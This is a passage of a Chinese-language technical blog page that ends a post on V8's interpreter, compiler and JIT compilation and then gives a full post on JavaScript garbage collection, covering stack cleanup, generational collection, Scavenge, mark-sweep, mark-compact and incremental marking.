<p>V8 的解释器和编译器的取名也很有意思。解释器 Ignition 是点火器的意思，编译器 TurboFan 是涡轮增压的意思，寓意着代码启动时通过点火器慢慢发动，一旦启动，涡轮增压介入，其执行效率随着执行时间越来越高效率，因为热点代码都被编译器 TurboFan 转换了机器码，直接执行机器码就省去了字节码“翻译”为机器码的过程。</p>
<p>其实字节码配合解释器和编译器是最近一段时间很火的技术，比如 Java 和 Python 的虚拟机也都是基于这种技术实现的，我们把这种技术称为即时编译（JIT）。具体到 V8，就是指解释器 Ignition 在解释执行字节码的同时，收集代码信息，当它发现某一部分代码变热了之后，TurboFan 编译器便闪亮登场，把热点的字节码转换为机器码，并把转换后的机器码保存起来，以备下次使用。</p>
<p>对于 JavaScript 工作引擎，除了 V8 使用了“字节码 +JIT”技术之外，苹果的 SquirrelFish Extreme 和 Mozilla 的 SpiderMonkey 也都使用了该技术。</p>
<p>理解 JIT 这套工作机制还是很有必要的。你可以结合下图看看 JIT 的工作过程：</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img6.png" class="" title="即时编译（JIT）技术">

<h1 id="JavaScript-的性能优化"><a href="#JavaScript-的性能优化" class="headerlink" title="JavaScript 的性能优化"></a>JavaScript 的性能优化</h1><p>到这里相信你现在已经了解 V8 是如何执行一段 JavaScript 代码的了。在过去几年中，JavaScript 的性能得到了大幅提升，这得益于 V8 团队对解释器和编译器的不断改进和优化。</p>
<p>虽然在 V8 诞生之初，也出现过一系列针对 V8 而专门优化 JavaScript 性能的方案。不过随着 V8 的架构调整，你越来越不需要这些微优化策略了，相反，对于优化 JavaScript 执行效率，你应该将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：</p>
<ul>
<li>提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；</li>
<li>避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；</li>
<li>减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6/" rel="tag">JS内存机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS内存机制——垃圾回收"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"
    >JS内存机制——垃圾回收</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/" class="article-date">
  <time datetime="2019-11-22T08:32:02.000Z" itemprop="datePublished">2019-11-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>不同语言的垃圾回收策略。<br>通常情况下，垃圾数据回收分为手动回收和自动回收两种策略。</p>
<p>如 C&#x2F;C++ 就是使用手动回收策略，何时分配内存、何时销毁内存都是由代码控制的，你可以参考下面这段 C 代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在堆中分配内存</span></span><br><span class="line"><span class="type">char</span>* p =  (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">2048</span>);  <span class="comment">// 在堆空间中分配 2048 字节的空间，并将分配后的引用地址保存到 p 中</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 使用 p 指向的内存</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">//....</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用结束后，销毁这段内存</span></span><br><span class="line"><span class="built_in">free</span>(p)；</span><br><span class="line">p = <span class="literal">NULL</span>；</span><br></pre></td></tr></table></figure>
<p>从上面这段 C 代码可以看出来，要使用堆中的一块空间，我们需要先调用<code>mallco</code>函数分配内存，然后再使用；当不再需要这块数据的时候，就要手动调用<code>free</code>函数来释放内存。如果这段数据已经不再需要了，但是又没有主动调用<code>free</code>函数来销毁，那么这种情况就被称为内存泄漏。</p>
<p>另外一种使用的是自动垃圾回收的策略，如 JavaScript、Java、Python 等语言，产生的垃圾数据是由垃圾回收器来释放的，并不需要手动通过代码来释放。</p>
<p>对于 JavaScript 而言，也正是这个“自动”释放资源的特性带来了很多困惑，也让一些 JavaScript 开发者误以为可以不关心内存管理，这是一个很大的误解。</p>
<h1 id="调用栈中的数据是如何回收的"><a href="#调用栈中的数据是如何回收的" class="headerlink" title="调用栈中的数据是如何回收的"></a>调用栈中的数据是如何回收的</h1><p>首先是调用栈中的数据，我们还是通过一段示例代码的执行流程来分析其回收机制，具体如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> b = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客邦 &quot;</span>&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showName</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line">      <span class="keyword">var</span> d = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客时间 &quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showName</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure>
<p>当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img1.png" class="" title="执行到 showName 函数时的内存模型">

<p>从图中可以看出，原始类型的数据被分配到栈中，引用类型的数据会被分配到堆中。当<code>foo</code>函数执行结束之后，<code>foo</code>函数的执行上下文会从堆中被销毁掉，那么它是怎么被销毁的呢？下面我们就来分析一下。</p>
<p>如果执行到<code>showName</code>函数时，那么 JavaScript 引擎会创建<code>showName</code>函数的执行上下文，并将<code>showName</code>函数的执行上下文压入到调用栈中，最终执行到<code>showName</code>函数时，其调用栈就如上图所示。与此同时，还有一个记录当前执行状态的指针（称为 ESP），指向调用栈中<code>showName</code>函数的执行上下文，表示当前正在执行<code>showName</code>函数。</p>
<p>接着，当<code>showName</code>函数执行完成之后，函数执行流程就进入了<code>foo</code>函数，那这时就需要销毁<code>showName</code>函数的执行上下文了。ESP 这时候就帮上忙了，JavaScript 会将 ESP 下移到<code>foo</code>函数的执行上下文，这个下移操作就是销毁<code>showName</code>函数执行上下文的过程。</p>
<p>你可能会有点懵，ESP 指针向下移动怎么就能把<code>showName</code>的执行上下文销毁了呢？具体你可以看下面这张移动 ESP 前后的对比图：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img2.png" class="" title="从栈中回收 showName 执行上下文">

<p>从图中可以看出，当<code>showName</code>函数执行结束之后，ESP 向下移动到<code>foo</code>函数的执行上下文中，上面<code>showName</code>的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当<code>foo</code>函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。</p>
<p>所以说，当一个函数执行结束之后，JavaScript 引擎会通过向下移动 ESP 来销毁该函数保存在栈中的执行上下文。</p>
<h1 id="堆中的数据是如何回收的"><a href="#堆中的数据是如何回收的" class="headerlink" title="堆中的数据是如何回收的"></a>堆中的数据是如何回收的</h1><p>当上面那段代码的<code>foo</code>函数执行结束之后，ESP 应该是指向全局执行上下文的，那这样的话，<code>showName</code>函数和<code>foo</code>函数的执行上下文就处于无效状态了，不过保存在堆中的两个对象依然占用着空间，如下图所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img3.png" class="" title="foo 函数执行结束后的内存状态">

<p>从图中可以看出，1003 和 1050 这两块内存依然被占用。要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了。</p>
<p>所以，接下来我们就来通过 Chrome 的 JavaScript 引擎 V8 来分析下堆中的垃圾数据是如何回收的。</p>
<h1 id="代际假说和分代收集"><a href="#代际假说和分代收集" class="headerlink" title="代际假说和分代收集"></a>代际假说和分代收集</h1><p>不过在正式介绍 V8 是如何实现回收之前，你需要先学习下代际假说（<code>The Generational Hypothesis</code>）的内容，这是垃圾回收领域中一个重要的术语，后续垃圾回收的策略都是建立在该假说的基础之上的，所以很是重要。</p>
<p>代际假说有以下两个特点：</p>
<ul>
<li>第一个是大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；</li>
<li>第二个是不死的对象，会活得更久。</li>
</ul>
<p>其实这两个特点不仅仅适用于 JavaScript，同样适用于大多数的动态语言，如 Java、Python 等。</p>
<p>有了代际假说的基础，我们就可以来探讨 V8 是如何实现垃圾回收的了。</p>
<p>通常，垃圾回收算法有很多种，但是并没有哪一种能胜任所有的场景，你需要权衡各种场景，根据对象的生存周期的不同而使用不同的算法，以便达到最好的效果。</p>
<p>所以，在 V8 中会把堆分为新生代和老生代两个区域，新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象。</p>
<p>新生区通常只支持 1～8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。</p>
<p>副垃圾回收器，主要负责新生代的垃圾回收。<br>主垃圾回收器，主要负责老生代的垃圾回收。</p>
<h1 id="垃圾回收器的工作流程"><a href="#垃圾回收器的工作流程" class="headerlink" title="垃圾回收器的工作流程"></a>垃圾回收器的工作流程</h1><p>现在你知道了 V8 把堆分成两个区域——新生代和老生代，并分别使用两个不同的垃圾回收器。其实不论什么类型的垃圾回收器，它们都有一套共同的执行流程。</p>
<p>第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。</p>
<p>第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。</p>
<p>第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为内存碎片。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。所以最后一步需要整理这些内存碎片，但这步其实是可选的，因为有的垃圾回收器不会产生内存碎片，比如接下来我们要介绍的副垃圾回收器。</p>
<p>那么接下来，我们就按照这个流程来分析新生代垃圾回收器（副垃圾回收器）和老生代垃圾回收器（主垃圾回收器）是如何处理垃圾回收的。</p>
<h1 id="副垃圾回收器"><a href="#副垃圾回收器" class="headerlink" title="副垃圾回收器"></a>副垃圾回收器</h1><p>副垃圾回收器主要负责新生区的垃圾回收。而通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。</p>
<p>新生代中用<code>Scavenge</code>算法来处理。所谓<code>Scavenge</code>算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img4.png" class="" title="新生区要划分为对象区域和空闲区域">

<p>新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。</p>
<p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p>
<p>完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种角色翻转的操作还能让新生代中的这两块区域无限重复使用下去。</p>
<p>由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以为了执行效率，一般新生区的空间会被设置得比较小。</p>
<p>也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了对象晋升策略，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。</p>
<h1 id="主垃圾回收器"><a href="#主垃圾回收器" class="headerlink" title="主垃圾回收器"></a>主垃圾回收器</h1><p>主垃圾回收器主要负责老生区中的垃圾回收。除了新生区中晋升的对象，一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。</p>
<p>由于老生区的对象比较大，若要在老生区中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。因而，主垃圾回收器是采用标记 - 清除（<code>Mark-Sweep</code>）的算法进行垃圾回收的。下面我们来看看该算法是如何工作的。</p>
<p>首先是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为活动对象，没有到达的元素就可以判断为垃圾数据。</p>
<p>比如最开始的那段代码，当<code>showName</code>函数执行退出之后，这段代码的调用栈和堆空间如下图所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img5.png" class="" title="标记过程">

<p>从上图你可以大致看到垃圾数据的标记过程，当<code>showName</code>函数执行结束之后，ESP 向下移动，指向了<code>foo</code>函数的执行上下文，这时候如果遍历调用栈，是不会找到引用 1003 地址的变量，也就意味着 1003 这块数据为垃圾数据，被标记为红色。由于 1050 这块数据被变量<code>b</code>引用了，所以这块数据会被标记为活动对象。这就是大致的标记过程。</p>
<p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，你可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img6.png" class="" title="标记清除过程">

<p>上面的标记过程和清除过程就是标记 - 清除算法，不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——标记 - 整理（<code>Mark-Compact</code>），这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。你可以参考下图：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img7.png" class="" title="标记整理过程">

<h1 id="全停顿"><a href="#全停顿" class="headerlink" title="全停顿"></a>全停顿</h1><p>现在你知道了 V8 是使用副垃圾回收器和主垃圾回收器处理垃圾回收的，不过由于 JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做全停顿（<code>Stop-The-World</code>）。</p>
<p>比如堆中的数据有<code>1.5GB</code>，V8 实现一次完整的垃圾回收需要 1 秒以上的时间，这也是由于垃圾回收而引起 JavaScript 线程暂停执行的时间，若是这样的时间花销，那么应用的性能和响应能力都会直线下降。主垃圾回收器执行一次完整的垃圾回收流程如下图所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img8.png" class="" title="全停顿">

<p>在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样了。如果在执行垃圾回收的过程中，占用主线程时间过久，就像上面图片展示的那样，花费了 200 毫秒，在这 200 毫秒内，主线程是不能做其他事情的。比如页面正在执行一个 JavaScript 动画，因为垃圾回收器在工作，就会导致这个动画在这 200 毫秒内无法执行的，这将会造成页面的卡顿现象。</p>
<p>为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为增量标记（Incremental Marking）算法。如下图所示：</p>
<img src="/2019/11/22/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/img9.png" class="" title="增量标记">

<p>使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行，这样当执行上述动画效果时，就不会让用户因为垃圾回收任务而感受到页面的卡顿了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>首先我们介绍了不同语言的垃圾回收策略，然后又说明了栈中的数据是如何回收的，最后重点讲解了 JavaScript 中的垃圾回收器是如何工作的。</p>
<p>从上面的分析你也能看出来，无论是垃圾回收的策略，还是处理全停顿的策略，往往都没有一个完美的解决方案，你需要花一些时间来做权衡，而这需要牺牲当前某几方面的指标来换取其他几个指标的提升。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6/" rel="tag">JS内存机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/27/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="page-number" href="/page/27/">27</a><span class="page-number current">28</span><a class="page-number" href="/page/29/">29</a><a class="page-number" href="/page/30/">30</a><span class="space">&hellip;</span><a class="page-number" href="/page/37/">37</a><a class="extend next" rel="next" href="/page/29/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2017-2023
        <i class="ri-heart-fill heart_icon"></i> WSQ
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="学海无涯"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>复制</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>